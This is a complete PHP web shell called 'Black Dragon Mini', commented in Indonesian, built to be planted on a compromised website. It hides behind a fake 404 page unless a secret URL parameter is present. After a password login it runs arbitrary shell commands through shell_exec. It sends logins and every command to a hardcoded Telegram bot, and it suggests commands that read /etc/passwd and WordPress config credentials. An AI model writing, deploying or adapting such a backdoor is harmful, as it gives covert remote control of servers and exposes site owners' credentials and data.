<?php
/* ============================================================
 *  B L A C K   D R A G O N   M I N I   S H E L L   v3.3
 * ============================================================
 *  File: minishell.php
 *  Nama shell: BLACK DRAGON MINI
 *  --------------------------------------------------------
 *  Akses  : domain.com/minishell.php?nagahitam  (WAJIB)
 *           Tanpa parameter nagahitam -> HTTP 404 palsu
 *  Login  : POST pass=Lapetkudanil123@
 *  Sesi   : PHP session server-side (TIDAK ADA cookie auth)
 *  Probe  : ?nagahitam&h=bd  ->  BDGK<md5('blackdragon')>
 *  Fungsi : eksekusi command (shell_exec), ringan & simpel
 *  Log    : aktivitas login & command dikirim ke Telegram
 * ============================================================
 */

/* ---- KONFIGURASI TELEGRAM ---- */
define('TELEGRAM_BOT_TOKEN', '7672463085:AAFv4AZzzjOvJMhR7KrwBTM7vV4Wecd7BgQ');
define('TELEGRAM_CHAT_ID', '-1002624693937');
/* ----------------------------- */

@session_start();
@error_reporting(0);
@set_time_limit(0);

$BDKey   = '$2b$10$nQ3Udh6vbN5rOp3ru8TIl.E8F7k6xuQO0uwIWTxSX6ObE5OT6fteK'; // Lapetkudanil123@
$BDProbe = 'BDGK' . md5('blackdragon');

/* ---------- util telegram ---------- */
function bdMiniTG($message) {
    $api = getenv('BLACKDRAGON_TG_URL');
    $base = $api ? rtrim($api, '/') : "https://api.telegram.org";
    $url = $base . "/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage"
         . "?chat_id=" . urlencode(TELEGRAM_CHAT_ID)
         . "&text=" . urlencode($message);
    $ctx = stream_context_create(array('http' => array('timeout' => 4, 'ignore_errors' => true)));
    @file_get_contents($url, false, $ctx);
}

function bdMiniLog($activity) {
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $fullPath = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
    $msg = "BLACK DRAGON Mini Shell\n"
         . "Aktivitas : " . $activity . "\n"
         . "IP        : " . $ip . "\n"
         . "User-Agent: " . $ua . "\n"
         . "URL       : " . $domain . $fullPath;
    bdMiniTG($msg);
}

/* ---------- GATE: tanpa ?nagahitam -> 404 palsu ---------- */
if (!isset($_GET['nagahitam'])) {
    http_response_code(404);
    echo "<!DOCTYPE html><html><head><title>Page not found</title></head>"
       . "<body style='background:#f0f0f1;color:#3c434a;font-family:-apple-system,"
       . "BlinkMacSystemFont,Segoe UI,Roboto,sans-serif'>"
       . "<div style='max-width:560px;margin:80px auto;padding:24px'>"
       . "<h1 style='font-size:23px;font-weight:400'>Page not found</h1>"
       . "<p style='color:#787c82;font-size:14px'>The page you requested could not be found.</p>"
       . "</div></body></html>";
    bdMiniLog("AKSES TANPA KATA KUNCI (mini-shell di-scan)");
    return;
}

/* ---------- health probe ---------- */
if (isset($_GET['h']) && $_GET['h'] === 'bd') {
    header('Content-Type: text/plain; charset=utf-8');
    echo $BDProbe;
    return;
}

/* ---------- LOGIN (password, tanpa cookie) ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
    if (password_verify($_POST['pass'], $BDKey)) {
        session_regenerate_id(true);
        $_SESSION['bd_mini_auth'] = true;
        bdMiniLog("MINI SHELL LOGIN BERHASIL");
    } else {
        bdMiniLog("MINI SHELL LOGIN GAGAL - password salah");
        http_response_code(404);
        echo "<h1>Page not found</h1>";
        return;
    }
}

/* ---------- LOGOUT ---------- */
if (isset($_GET['logout'])) {
    bdMiniLog("MINI SHELL LOGOUT");
    $_SESSION = array();
    session_destroy();
    http_response_code(404);
    echo "<h1>Page not found</h1>";
    return;
}

/* ---------- HALAMAN LOGIN ---------- */
if (empty($_SESSION['bd_mini_auth'])) {
    echo "<!DOCTYPE html><html><head><title>404</title><meta charset='utf-8'>"
       . "<style>body{margin:0;min-height:100vh;background:linear-gradient(135deg,#0a0a0f,#1a1a2e);"
       . "display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif}"
       . ".bd-box{background:rgba(8,8,14,.85);border:1px solid #6d3b8f;border-radius:14px;"
       . "padding:42px 38px;width:320px;text-align:center;box-shadow:0 0 40px rgba(109,59,143,.45)}"
       . ".bd-logo{color:#c084fc;font-weight:800;letter-spacing:3px;font-size:18px;"
       . "text-shadow:0 0 14px rgba(192,132,252,.8);margin-bottom:24px}"
       . "input{width:100%;box-sizing:border-box;padding:12px 14px;margin:6px 0;"
       . "background:rgba(20,20,30,.85);border:1px solid #3a2a4d;border-radius:8px;color:#eee;outline:none}"
       . "input:focus{border-color:#9333ea}button{width:100%;padding:12px;margin-top:10px;"
       . "background:linear-gradient(90deg,#7c3aed,#a855f7);color:#fff;border:0;border-radius:8px;"
       . "font-weight:700;cursor:pointer}button:hover{filter:brightness(1.15)}</style></head><body>"
       . "<div class='bd-box'><div class='bd-logo'>&#9650; BLACK DRAGON MINI &#9650;</div>"
       . "<form method='post' autocomplete='off'>"
       . "<input type='password' name='pass' placeholder='Password' autofocus>"
       . "<button>Masuk</button></form></div></body></html>";
    return;
}

/* ================= AUTHENTICATED - COMMAND SHELL ================= */

/* Eksekusi command */
if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    bdMiniLog("EKSEKUSI: " . substr($_POST['cmd'], 0, 200));
    $out = @shell_exec(stripcslashes($_POST['cmd']) . ' 2>&1');
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>404</title>
    <meta charset="utf-8">
    <style>
    body {
        margin: 0;
        min-height: 100vh;
        font-family: 'Segoe UI', monospace;
        background: linear-gradient(135deg, #0a0a0f, #1a1a2e);
        color: #e8e8f0;
    }
    .bd-top {
        display: flex;
        gap: 16px;
        align-items: center;
        padding: 10px 18px;
        background: rgba(8,8,14,.85);
        border-bottom: 1px solid #6d3b8f;
    }
    .bd-logo {
        color: #c084fc;
        font-weight: 800;
        letter-spacing: 2px;
        font-size: 15px;
    }
    .bd-info {
        font-size: 11px;
        color: #9a9ab0;
        flex: 1;
    }
    .bd-out {
        color: #f472b6;
        font-size: 12px;
        text-decoration: none;
    }
    .bd-form {
        position: fixed;
        top: 64px;
        left: 18px;
        right: 18px;
        display: flex;
        gap: 8px;
    }
    .bd-form input {
        flex: 1;
        background: rgba(20,20,30,.85);
        border: 1px solid #3a2a4d;
        border-radius: 6px;
        padding: 10px 12px;
        color: #eee;
        outline: none;
        font-family: monospace;
        font-size: 13px;
    }
    .bd-form input:focus { border-color: #9333ea; }
    .bd-form button {
        padding: 10px 26px;
        background: linear-gradient(90deg, #7c3aed, #a855f7);
        color: #fff;
        border: 0;
        border-radius: 6px;
        font-weight: 700;
        cursor: pointer;
    }
    .bd-form button:hover { filter: brightness(1.15); }
    pre.bd-out {
        position: fixed;
        top: 120px;
        left: 18px;
        right: 18px;
        bottom: 18px;
        overflow: auto;
        background: rgba(5,5,10,.88);
        border: 1px solid #3a2a4d;
        border-radius: 8px;
        padding: 14px;
        font-size: 12.5px;
        line-height: 1.5;
        color: #c9f7d4;
        white-space: pre-wrap;
        word-wrap: break-word;
    }
    .bd-help {
        position: fixed;
        bottom: 18px;
        left: 18px;
        right: 18px;
        text-align: center;
        font-size: 11px;
        color: #77778c;
    }
    code {
        background: #241332;
        padding: 1px 6px;
        border-radius: 4px;
        color: #d8b4fe;
        font-size: 11px;
    }
    </style>
</head>
<body>
    <div class="bd-top">
        <span class="bd-logo">&#9650; BLACK DRAGON MINI</span>
        <span class="bd-info">server: <?php echo @php_uname(); ?> | php <?php echo PHP_VERSION; ?></span>
        <a class="bd-out" href="?nagahitam&logout">logout</a>
    </div>
    <form method="post" class="bd-form">
        <input type="text" name="cmd" placeholder="perintah (id, ls -la, cat /etc/passwd...)" autofocus
               value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>">
        <button type="submit">Run</button>
    </form>
    <?php if (isset($out)): ?>
    <pre class="bd-out"><?php echo htmlspecialchars($out ?: '(kosong)'); ?></pre>
    <?php else: ?>
    <pre class="bd-out"><?php echo htmlspecialchars((isset($_POST['cmd']) ? '$ ' . $_POST['cmd'] : '(menunggu perintah)')); ?></pre>
    <?php endif; ?>
    <div class="bd-help">
        contoh: <code>id</code> <code>ls -la</code> <code>cat wp-config.php</code>
        <code>find / -name 'wp-config.php' 2>/dev/null</code> <code>whoami</code>
    </div>
</body>
</html>
